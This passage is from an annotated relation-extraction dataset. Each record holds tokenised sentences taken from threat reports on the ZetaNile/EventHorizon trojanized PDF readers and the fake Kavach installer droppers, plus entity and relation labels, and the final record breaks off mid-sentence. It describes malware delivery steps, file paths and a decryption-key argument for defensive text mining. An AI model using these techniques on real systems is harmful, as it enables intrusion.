"index": "3_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [46, 46], "name": "backdoor", "pos": [31, 32], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [51, 51], "name": "PDF files", "pos": [36, 38], "index": "6_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [54, 54], "name": "SecurePDF.exe", "pos": [0, 1], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [63, 63], "name": "ZetaNile implant", "pos": [9, 11], "index": "8_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [71, 71], "name": "themed file", "pos": [17, 19], "index": "9_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [80, 80], "name": "PDF", "pos": [2, 3], "index": "10_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [89, 89], "name": "decryption key", "pos": [11, 13], "index": "11_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [96, 96], "name": "payload", "pos": [18, 19], "index": "12_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [99, 99], "name": "encrypted decoy PDF", "pos": [21, 24], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [108, 108], "name": "Sumatra PDF Reader", "pos": [30, 33], "index": "14_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [125, 125], "name": "malware", "pos": [8, 9], "index": "15_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [135, 135], "name": "hostname", "pos": [18, 19], "index": "16_0"}], [{"type": "TF", "sent_id": 4, "global_pos": [137, 137], "name": "device information", "pos": [20, 22], "index": "17_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [145, 145], "name": "C2 communication server", "pos": [28, 31], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [152, 152], "name": "C2 check-in process", "pos": [35, 38], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [157, 157], "name": "attackers", "pos": [1, 2], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [160, 160], "name": "additional malware", "pos": [4, 6], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [168, 168], "name": "C2 communication", "pos": [12, 14], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [178, 178], "name": "muPDF/Subliminal Recording installer", "pos": [5, 8], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [182, 182], "name": "setup.exe", "pos": [9, 10], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "ISSetupPrerequisites\\Setup64.exe", "pos": [18, 19], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [195, 195], "name": "C : \\colrctl\\colorui.dll", "pos": [22, 25], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [208, 208], "name": "It", "pos": [0, 1], "index": "27_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [211, 211], "name": "C : \\Windows\\System32\\ColorCpl.exe", "pos": [3, 6], "index": "28_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [215, 215], "name": "C : \\ColorCtrl\\ColorCpl.exe", "pos": [7, 10], "index": "29_0"}]], "labels": [{"r": "EX", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [1], "h": 2, "t": 3}, {"r": "FR", "evidence": [1], "h": 4, "t": 5}, {"r": "WR", "evidence": [1], "h": 5, "t": 6}, {"r": "WR", "evidence": [1, 2], "t": 6, "h": 7}, {"r": "FR", "evidence": [2], "h": 7, "t": 8}, {"r": "RD", "evidence": [2], "h": 7, "t": 9}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 10}, {"r": "WR", "evidence": [2, 3], "h": 8, "t": 12}, {"r": "WR", "evidence": [3], "t": 12, "h": 14}, {"r": "RD", "evidence": [3], "t": 13, "h": 14}, {"r": "CO", "evidence": [3], "h": 10, "t": 13}, {"r": "RD", "evidence": [4], "h": 15, "t": 16}, {"r": "RD", "evidence": [4], "h": 15, "t": 17}, {"r": "ST", "evidence": [4], "h": 15, "t": 18}, {"r": "RD", "evidence": [4], "t": 17, "h": 19}, {"r": "FR", "evidence": [5], "h": 20, "t": 21}, {"r": "FR", "evidence": [5], "h": 20, "t": 22}, {"r": "FR", "evidence": [6], "h": 23, "t": 24}, {"r": "RD", "evidence": [6], "h": 24, "t": 25}, {"r": "WR", "evidence": [6], "h": 24, "t": 26}, {"r": "CO", "evidence": [6, 7], "h": 24, "t": 27}, {"r": "RD", "evidence": [7], "h": 27, "t": 28}, {"r": "WR", "evidence": [7], "h": 27, "t": 29}]}, {"title": "052-30", "sents": [["While", "the", "malicious", "Sumatra", "PDF", "reader", "is", "a", "fully", "functional", "PDF", "reader", "that", "can", "load", "the", "malicious", "implant", "from", "a", "fake", "PDF", ",", "the", "muPDF/Subliminal", "Recording", "installer", "can", "set", "up", "the", "backdoor", "without", "loading", "any", "malicious", "PDF", "files", "."], ["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "contains", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Once", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "is", "configured", "to", "send", "the", "victim", "'", "s", "system", "hostname", "and", "device", "information", "using", "custom", "encoding", "algorithms", "to", "a", "C2", "communication", "server", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "can", "install", "additional", "malware", "onto", "the", "compromised", "devices", "using", "the", "C2", "communication", "as", "needed", "."], ["Within", "the", "trojanized", "version", "of", "muPDF/Subliminal", "Recording", "installer", ",", "setup.exe", "is", "configured", "to", "check", "if", "the", "file", "path", "ISSetupPrerequisites\\Setup64.exe", "exists", "and", "write", "C", ":", "\\colrctl\\colorui.dll", "on", "disk", "after", "extracting", "the", "embedded", "executable", "inside", "setup.exe", "."], ["It", "then", "copies", "C", ":", "\\Windows\\System32\\ColorCpl.exe", "to", "C", ":", "\\ColorCtrl\\ColorCpl.exe", "."], ["For", "the", "second", "stage", "malware", ",", "the", "malicious", "installer", "creates", "a", "new", "process", "C", ":", "\\colorctrl\\colorcpl.exe", "C3A9B30B6A313F289297C9A36730DB6D", ",", "and", "the", "argument", "C3A9B30B6A313F289297C9A36730DB6D", "gets", "passed", "on", "to", "colorui.dll", "as", "a", "decryption", "key", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [3, 3], "name": "Sumatra PDF reader", "pos": [3, 6], "index": "0_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "implant", "pos": [17, 18], "index": "1_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [24, 24], "name": "muPDF/Subliminal Recording installer", "pos": [24, 27], "index": "2_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [31, 31], "name": "backdoor", "pos": [31, 32], "index": "3_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [36, 36], "name": "PDF files", "pos": [36, 38], "index": "4_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [39, 39], "name": "SecurePDF.exe", "pos": [0, 1], "index": "5_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [48, 48], "name": "ZetaNile implant", "pos": [9, 11], "index": "6_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [56, 56], "name": "themed file", "pos": [17, 19], "index": "7_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [65, 65], "name": "PDF", "pos": [2, 3], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [74, 74], "name": "decryption key", "pos": [11, 13], "index": "9_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [81, 81], "name": "payload", "pos": [18, 19], "index": "10_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [84, 84], "name": "encrypted decoy PDF", "pos": [21, 24], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [93, 93], "name": "Sumatra PDF Reader", "pos": [30, 33], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [110, 110], "name": "malware", "pos": [8, 9], "index": "13_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [120, 120], "name": "hostname", "pos": [18, 19], "index": "14_0"}], [{"type": "TF", "sent_id": 3, "global_pos": [122, 122], "name": "device information", "pos": [20, 22], "index": "15_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [130, 130], "name": "C2 communication server", "pos": [28, 31], "index": "16_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [137, 137], "name": "C2 check-in process", "pos": [35, 38], "index": "17_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [142, 142], "name": "attackers", "pos": [1, 2], "index": "18_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [145, 145], "name": "additional malware", "pos": [4, 6], "index": "19_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [153, 153], "name": "C2 communication", "pos": [12, 14], "index": "20_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [163, 163], "name": "muPDF/Subliminal Recording installer", "pos": [5, 8], "index": "21_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [167, 167], "name": "setup.exe", "pos": [9, 10], "index": "22_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [176, 176], "name": "ISSetupPrerequisites\\Setup64.exe", "pos": [18, 19], "index": "23_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [180, 180], "name": "C : \\colrctl\\colorui.dll", "pos": [22, 25], "index": "24_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [193, 193], "name": "It", "pos": [0, 1], "index": "25_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [196, 196], "name": "C : \\Windows\\System32\\ColorCpl.exe", "pos": [3, 6], "index": "26_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [200, 200], "name": "C : \\ColorCtrl\\ColorCpl.exe", "pos": [7, 10], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [211, 211], "name": "malicious installer", "pos": [7, 9], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [217, 217], "name": "C : \\colorctrl\\colorcpl.exe", "pos": [13, 16], "index": "29_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [230, 230], "name": "colorui.dll", "pos": [26, 27], "index": "30_0"}]], "labels": [{"r": "RD", "evidence": [0], "h": 0, "t": 1}, {"r": "FR", "evidence": [0], "h": 2, "t": 3}, {"r": "WR", "evidence": [0], "h": 3, "t": 4}, {"r": "WR", "evidence": [0, 1], "t": 4, "h": 5}, {"r": "FR", "evidence": [1], "h": 5, "t": 6}, {"r": "RD", "evidence": [1], "h": 5, "t": 7}, {"r": "WR", "evidence": [1, 2], "h": 6, "t": 8}, {"r": "WR", "evidence": [1, 2], "h": 6, "t": 10}, {"r": "WR", "evidence": [2], "t": 10, "h": 12}, {"r": "RD", "evidence": [2], "t": 11, "h": 12}, {"r": "CO", "evidence": [2], "h": 8, "t": 11}, {"r": "RD", "evidence": [3], "h": 13, "t": 14}, {"r": "RD", "evidence": [3], "h": 13, "t": 15}, {"r": "ST", "evidence": [3], "h": 13, "t": 16}, {"r": "RD", "evidence": [3], "t": 15, "h": 17}, {"r": "FR", "evidence": [4], "h": 18, "t": 19}, {"r": "FR", "evidence": [4], "h": 18, "t": 20}, {"r": "FR", "evidence": [5], "h": 21, "t": 22}, {"r": "RD", "evidence": [5], "h": 22, "t": 23}, {"r": "WR", "evidence": [5], "h": 22, "t": 24}, {"r": "CO", "evidence": [5, 6], "h": 22, "t": 25}, {"r": "RD", "evidence": [6], "h": 25, "t": 26}, {"r": "WR", "evidence": [6], "h": 25, "t": 27}, {"r": "FR", "evidence": [7], "h": 28, "t": 29}, {"r": "WR", "evidence": [7], "h": 28, "t": 30}]}, {"title": "052-31", "sents": [["SecurePDF.exe", "is", "a", "modularized", "loader", "that", "can", "install", "the", "ZetaNile", "implant", "by", "loading", "a", "weaponized", "job", "application", "themed", "file", "with", "a", ".PDF", "extension", "."], ["The", "fake", "PDF", "contains", "a", "header", "``", "SPV005", "''", ",", "a", "decryption", "key", ",", "encrypted", "second", "stage", "implant", "payload", ",", "and", "encrypted", "decoy", "PDF", ",", "which", "is", "rendered", "in", "the", "Sumatra", "PDF", "Reader", "when", "the", "file", "is", "opened", "."], ["Once", "loaded", "in", "memory", ",", "the", "second", "stage", "malware", "is", "configured", "to", "send", "the", "victim", "'", "s", "system", "hostname", "and", "device", "information", "using", "custom", "encoding", "algorithms", "to", "a", "C2", "communication", "server", "as", "part", "of", "the", "C2", "check-in", "process", "."], ["The", "attackers", "can", "install", "additional", "malware", "onto", "the", "compromised", "devices", "using", "the", "C2", "communication", "as", "needed", "."], ["Within", "the", "trojanized", "version", "of", "muPDF/Subliminal", "Recording", "installer", ",", "setup.exe", "is", "configured", "to", "check", "if", "the", "file", "path", "ISSetupPrerequisites\\Setup64.exe", "exists", "and", "write", "C", ":", "\\colrctl\\colorui.dll", "on", "disk", "after", "extracting", "the", "embedded", "executable", "inside", "setup.exe", "."], ["It", "then", "copies", "C", ":", "\\Windows\\System32\\ColorCpl.exe", "to", "C", ":", "\\ColorCtrl\\ColorCpl.exe", "."], ["For", "the", "second", "stage", "malware", ",", "the", "malicious", "installer", "creates", "a", "new", "process", "C", ":", "\\colorctrl\\colorcpl.exe", "C3A9B30B6A313F289297C9A36730DB6D", ",", "and", "the", "argument", "C3A9B30B6A313F289297C9A36730DB6D", "gets", "passed", "on", "to", "colorui.dll", "as", "a", "decryption", "key", "."], ["The", "DLL", "colorui.dll", ",", "which", "Microsoft", "is", "tracking", "as", "the", "EventHorizon", "malware", "family", ",", "is", "injected", "into", "C", ":", "\\Windows\\System\\credwiz.exe", "or", "iexpress.exe", "to", "send", "C2", "HTTP", "requests", "as", "part", "of", "the", "victim", "check-in", "process", "and", "to", "get", "an", "additional", "payload", "."]], "vertexSet": [[{"type": "MP", "sent_id": 0, "global_pos": [0, 0], "name": "SecurePDF.exe", "pos": [0, 1], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [9, 9], "name": "ZetaNile implant", "pos": [9, 11], "index": "1_0"}], [{"type": "MF", "sent_id": 0, "global_pos": [17, 17], "name": "themed file", "pos": [17, 19], "index": "2_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [26, 26], "name": "PDF", "pos": [2, 3], "index": "3_0"}], [{"type": "TF", "sent_id": 1, "global_pos": [35, 35], "name": "decryption key", "pos": [11, 13], "index": "4_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [42, 42], "name": "payload", "pos": [18, 19], "index": "5_0"}], [{"type": "MF", "sent_id": 1, "global_pos": [45, 45], "name": "encrypted decoy PDF", "pos": [21, 24], "index": "6_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [54, 54], "name": "Sumatra PDF Reader", "pos": [30, 33], "index": "7_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [71, 71], "name": "malware", "pos": [8, 9], "index": "8_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [81, 81], "name": "hostname", "pos": [18, 19], "index": "9_0"}], [{"type": "TF", "sent_id": 2, "global_pos": [83, 83], "name": "device information", "pos": [20, 22], "index": "10_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [91, 91], "name": "C2 communication server", "pos": [28, 31], "index": "11_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [98, 98], "name": "C2 check-in process", "pos": [35, 38], "index": "12_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [103, 103], "name": "attackers", "pos": [1, 2], "index": "13_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [106, 106], "name": "additional malware", "pos": [4, 6], "index": "14_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [114, 114], "name": "C2 communication", "pos": [12, 14], "index": "15_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [124, 124], "name": "muPDF/Subliminal Recording installer", "pos": [5, 8], "index": "16_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [128, 128], "name": "setup.exe", "pos": [9, 10], "index": "17_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [137, 137], "name": "ISSetupPrerequisites\\Setup64.exe", "pos": [18, 19], "index": "18_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [141, 141], "name": "C : \\colrctl\\colorui.dll", "pos": [22, 25], "index": "19_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [154, 154], "name": "It", "pos": [0, 1], "index": "20_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [157, 157], "name": "C : \\Windows\\System32\\ColorCpl.exe", "pos": [3, 6], "index": "21_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [161, 161], "name": "C : \\ColorCtrl\\ColorCpl.exe", "pos": [7, 10], "index": "22_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [172, 172], "name": "malicious installer", "pos": [7, 9], "index": "23_0"}], [{"type": "MP", "sent_id": 6, "global_pos": [178, 178], "name": "C : \\colorctrl\\colorcpl.exe", "pos": [13, 16], "index": "24_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "colorui.dll", "pos": [26, 27], "index": "25_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [199, 199], "name": "colorui.dll", "pos": [2, 3], "index": "26_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [202, 202], "name": "Microsoft", "pos": [5, 6], "index": "27_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [214, 214], "name": "C : \\Windows\\System\\credwiz.exe", "pos": [17, 20], "index": "28_0"}], [{"type": "MP", "sent_id": 7, "global_pos": [218, 218], "name": "iexpress.exe", "pos": [21, 22], "index": "29_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [236, 236], "name": "payload", "pos": [39, 40], "index": "30_0"}]], "labels": [{"r": "FR", "evidence": [0], "h": 0, "t": 1}, {"r": "RD", "evidence": [0], "h": 0, "t": 2}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "WR", "evidence": [0, 1], "h": 1, "t": 5}, {"r": "WR", "evidence": [1], "t": 5, "h": 7}, {"r": "RD", "evidence": [1], "t": 6, "h": 7}, {"r": "CO", "evidence": [1], "h": 3, "t": 6}, {"r": "RD", "evidence": [2], "h": 8, "t": 9}, {"r": "RD", "evidence": [2], "h": 8, "t": 10}, {"r": "ST", "evidence": [2], "h": 8, "t": 11}, {"r": "RD", "evidence": [2], "t": 10, "h": 12}, {"r": "FR", "evidence": [3], "h": 13, "t": 14}, {"r": "FR", "evidence": [3], "h": 13, "t": 15}, {"r": "FR", "evidence": [4], "h": 16, "t": 17}, {"r": "RD", "evidence": [4], "h": 17, "t": 18}, {"r": "WR", "evidence": [4], "h": 17, "t": 19}, {"r": "CO", "evidence": [4, 5], "h": 17, "t": 20}, {"r": "RD", "evidence": [5], "h": 20, "t": 21}, {"r": "WR", "evidence": [5], "h": 20, "t": 22}, {"r": "FR", "evidence": [6], "h": 23, "t": 24}, {"r": "WR", "evidence": [6], "h": 23, "t": 25}, {"r": "RD", "evidence": [6, 7], "h": 23, "t": 26}, {"r": "IJ", "evidence": [6, 7], "h": 23, "t": 28}, {"r": "IJ", "evidence": [6, 7], "h": 23, "t": 29}, {"r": "RD", "evidence": [6, 7], "h": 23, "t": 30}, {"r": "RD", "evidence": [7], "t": 26, "h": 27}, {"r": "WR", "evidence": [7], "h": 27, "t": 30}]}, {"title": "026-0", "sents": [["The", ".NET-based", "executables", "are", "known", "as", "droppers", "that", "are", "used", "for", "execution", "."], ["An", "infected", "endpoint", "is", "checked", "for", "specific", "keywords", "like", "``", "India", "''", "in", "the", "timezone", "by", "the", "droppers", "before", "beginning", "the", "execution", "."], ["A", "message", "appears", "in", "the", "form", "of", "a", "splash", "screen", "notifying", "the", "victim", "that", "the", "installation", "of", "Kavach", "application", "is", "taking", "place", "during", "execution", "."], ["After", "that", ",", "the", "downloaders", "connect", "to", "a", "fake", "website", "disguised", "as", "a", "trustworthy", "government", "entity", "in", "India", "to", "download", "the", "malicious", "payload", ".", "This", "payload", "is", "then", "activated", "on", "the", "endpoint", "."], ["In", "order", "to", "imitate", "legitimacy", ",", "downloaders", "download", "a", "legal", "version", "of", "Kavach", "application", "'s", "MSI", "installer", "from", "another", "website", ",", "which", "is", "managed", "by", "the", "attacker", ".", "Afterwards", ",", "the", "installer", "is", "launched", ",", "completing", "the", "whole", "attack", "chain", "."], ["Downloaders", "are", "responsible", "for", "bringing", "in", "the", "malicious", "payload", "and", "the", "legal", "Kavach", "installer", "."], ["In", "the", "campaign", ",", "there", "is", "another", "form", "of", "initial", "infection", "vector", "that", "involves", "a", "downloader", "binary", "that", "is", "largely", "sized", "at", "141MB", ".", "The", "downloader", "consists", "of", "the", "complete", "MSI", "installer", "(", "legitimate", "one", ")", "for", "the", "Kavach", "application", "."], ["The", "zipped", "version", "of", "the", "installer", "(", "MSI", ")", "is", "removed", "from", "the", "resources", "of", "the", "downloader", ",", "and", "it", "is", "executed", "on", "the", "system", "to", "appear", "legal", "to", "reach", "the", "targeted", "audience", "."]], "vertexSet": [[{"type": "SF", "sent_id": 0, "global_pos": [1, 1], "name": ".NET-based", "pos": [1, 2], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [6, 6], "name": "droppers", "pos": [6, 7], "index": "1_0"}], [{"type": "SO", "sent_id": 1, "global_pos": [14, 14], "name": "infected endpoint", "pos": [1, 3], "index": "2_0"}], [{"type": "MP", "sent_id": 1, "global_pos": [30, 30], "name": "droppers", "pos": [17, 18], "index": "3_0"}], [{"type": "TP", "sent_id": 2, "global_pos": [53, 53], "name": "Kavach", "pos": [17, 18], "index": "4_0"}], [{"type": "MP", "sent_id": 3, "global_pos": [65, 65], "name": "downloaders", "pos": [4, 5], "index": "5_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [70, 70], "name": "website", "pos": [9, 10], "index": "6_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [83, 83], "name": "payload", "pos": [22, 23], "index": "7_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [106, 106], "name": "Kavach application 's MSI installer", "pos": [12, 17], "index": "8_0"}], [{"type": "SO", "sent_id": 4, "global_pos": [113, 113], "name": "website", "pos": [19, 20], "index": "9_0"}], [{"type": "MP", "sent_id": 5, "global_pos": [135, 135], "name": "Downloaders", "pos": [0, 1], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [143, 143], "name": "payload", "pos": [8, 9], "index": "11_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [147, 147], "name": "Kavach installer", "pos": [12, 14], "index": "12_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [165, 165], "name": "downloader binary", "pos": [15, 17], "index": "13_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [180, 180], "name": "MSI", "pos": [30, 31], "index": "14_0"}], [{"type": "TF", "sent_id": 7, "global_pos": [192, 192], "name": "zipped", "pos": [1, 2], "index": "15_0"}], [{"type": "MF", "sent_id": 7, "global_pos": [204, 204], "name": "resources of the downloader", "pos": [13, 17], "index": "16_0"}]], "labels": [{"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "RD", "evidence": [0], "t": 0, "h": 1}, {"r": "WR", "evidence": [0], "t": 0, "h": 1}, {"r": "FR", "evidence": [0, 1, 2], "h": 1, "t": 4}, {"r": "CO", "evidence": [0, 1], "h": 1, "t": 3}, {"r": "CO", "evidence": [0, 1, 2, 3], "h": 1, "t": 5}, {"r": "ST", "evidence": [1], "t": 2, "h": 3}, {"r": "ST", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 4, "t": 6}, {"r": "RF", "evidence": [3], "h": 5, "t": 6}, {"r": "WR", "evidence": [3], "h": 5, "t": 7}, {"r": "EX", "evidence": [3], "h": 5, "t": 7}, {"r": "WR", "evidence": [3, 4], "h": 5, "t": 8}, {"r": "RF", "evidence": [3, 4], "h": 5, "t": 9}, {"r": "FR", "evidence": [3, 4, 5], "h": 5, "t": 10}, {"r": "CO", "evidence": [3, 4, 5], "h": 7, "t": 11}, {"r": "CO", "evidence": [4, 5], "h": 8, "t": 12}, {"r": "EX", "evidence": [5], "h": 10, "t": 11}, {"r": "CD", "evidence": [5], "h": 10, "t": 12}, {"r": "EX", "evidence": [5], "h": 10, "t": 12}, {"r": "WR", "evidence": [5, 6], "h": 10, "t": 13}, {"r": "CO", "evidence": [6, 7], "h": 14, "t": 15}]}, {"title": "026-1", "sents": [["An", "infected", "endpoint", "is", "checked", "for", "specific", "keywords", "like", "``", "India", "''", "in", "the", "timezone", "by", "the", "droppers", "before", "beginning", "the", "execution", "."], ["A", "message", "appears", "in", "the", "form", "of", "a", "splash", "screen", "notifying", "the", "victim", "that", "the", "installation", "of", "Kavach", "application", "is", "taking", "place", "during", "execution", "."], ["After", "that", ",", "the", "downloaders", "connect", "to", "a", "fake", "website", "disguised", "as", "a", "trustworthy", "government", "entity", "in", "India", "to", "download", "the", "malicious", "payload", ".", "This", "payload", "is", "then", "activated", "on", "the", "endpoint", "."], ["In", "order", "to", "imitate", "legitimacy", ",", "downloaders", "download", "a", "legal", "version", "of", "Kavach", "application", "'s", "MSI", "installer", "from", "another", "website", ",", "which", "is", "managed", "by", "the", "attacker", ".", "Afterwards", ",", "the", "installer", "is", "launched", ",", "completing", "the", "whole", "attack", "chain", "."], ["Downloaders", "are", "responsible", "for", "bringing", "in", "the", "malicious", "payload", "and", "the", "legal", "Kavach", "installer", "."], ["In", "the", "campaign", ",", "there", "is", "another", "form", "of", "initial", "infection", "vector", "that", "involves", "a", "downloader", "binary", "that", "is", "largely", "sized", "at", "141MB", ".", "The", "downloader", "consists", "of", "the", "complete", "MSI", "installer", "(", "legitimate", "one", ")", "for", "the", "Kavach", "application", "."], ["The", "zipped", "version", "of", "the", "installer", "(", "MSI", ")", "is", "removed", "from", "the", "resources", "of", "the", "downloader", ",", "and", "it", "is", "executed", "on", "the", "system", "to", "appear", "legal", "to", "reach", "the", "targeted", "audience", "."], ["The", "implanted", "malware", "is", "then", "uploaded", "from", "a", "remote", "area", ",", "decrypted", "by", "utilizing", "a", "hardcoded", "key", "of", "AES", "and", "saved", "on", "the", "infected", "endpoint", "."]], "vertexSet": [[{"type": "SO", "sent_id": 0, "global_pos": [1, 1], "name": "infected endpoint", "pos": [1, 3], "index": "0_0"}], [{"type": "MP", "sent_id": 0, "global_pos": [17, 17], "name": "droppers", "pos": [17, 18], "index": "1_0"}], [{"type": "TP", "sent_id": 1, "global_pos": [40, 40], "name": "Kavach", "pos": [17, 18], "index": "2_0"}], [{"type": "MP", "sent_id": 2, "global_pos": [52, 52], "name": "downloaders", "pos": [4, 5], "index": "3_0"}], [{"type": "SO", "sent_id": 2, "global_pos": [57, 57], "name": "website", "pos": [9, 10], "index": "4_0"}], [{"type": "MF", "sent_id": 2, "global_pos": [70, 70], "name": "payload", "pos": [22, 23], "index": "5_0"}], [{"type": "MF", "sent_id": 3, "global_pos": [93, 93], "name": "Kavach application 's MSI installer", "pos": [12, 17], "index": "6_0"}], [{"type": "SO", "sent_id": 3, "global_pos": [100, 100], "name": "website", "pos": [19, 20], "index": "7_0"}], [{"type": "MP", "sent_id": 4, "global_pos": [122, 122], "name": "Downloaders", "pos": [0, 1], "index": "8_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [130, 130], "name": "payload", "pos": [8, 9], "index": "9_0"}], [{"type": "MF", "sent_id": 4, "global_pos": [134, 134], "name": "Kavach installer", "pos": [12, 14], "index": "10_0"}], [{"type": "MF", "sent_id": 5, "global_pos": [152, 152], "name": "downloader binary", "pos": [15, 17], "index": "11_0"}], [{"type": "TF", "sent_id": 5, "global_pos": [167, 167], "name": "MSI", "pos": [30, 31], "index": "12_0"}], [{"type": "TF", "sent_id": 6, "global_pos": [179, 179], "name": "zipped", "pos": [1, 2], "index": "13_0"}], [{"type": "MF", "sent_id": 6, "global_pos": [191, 191], "name": "resources of the downloader", "pos": [13, 17], "index": "14_0"}]], "labels": [{"r": "ST", "evidence": [0], "t": 0, "h": 1}, {"r": "ST", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "RF", "evidence": [1, 2], "h": 2, "t": 4}, {"r": "RF", "evidence": [2], "h": 3, "t": 4}, {"r": "WR", "evidence": [2], "h": 3, "t": 5}, {"r": "EX", "evidence": [2], "h": 3, "t": 5}, {"r": "WR", "evidence": [2, 3], "h": 3, "t": 6}, {"r": "RF", "evidence": [2, 3], "h": 3, "t": 7}, {"r": "FR", "evidence": [2, 3, 4], "h": 3, "t": 8}, {"r": "CO", "evidence": [2, 3, 4], "h": 5, "t": 9}, {"r": "CO", "evidence": [3, 4], "h": 6, "t": 10}, {"r": "EX", "evidence": [4], "h": 8, "t": 9}, {"r": "CD", "evidence": [4], "h": 8, "t": 10}, {"r": "EX", "evidence": [4], "h": 8, "t": 10}, {"r": "WR", "evidence": [4, 5], "h": 8, "t": 11}, {"r": "CO", "evidence": [5, 6], "h": 12, "t": 13}]}, {"title": "026-2", "sents": [["A", "message", "appears", "in", "the", "form", "of", "a", "splash", "screen", "notifying", "the", "victim", "that", "the", "installation", "of", "Kavach", "application", "is", "taking", "place", "during", "execution", "."], ["After", "that", ",", "the", "downloaders", "connect", "to", "a", "fake", "website", "disguised", "as", "a", "trustworthy", "government", "entity", "in", "India", "to", "download", "the", "malicious", "payload", ".", "This", "payload", "is", "then", "activated", 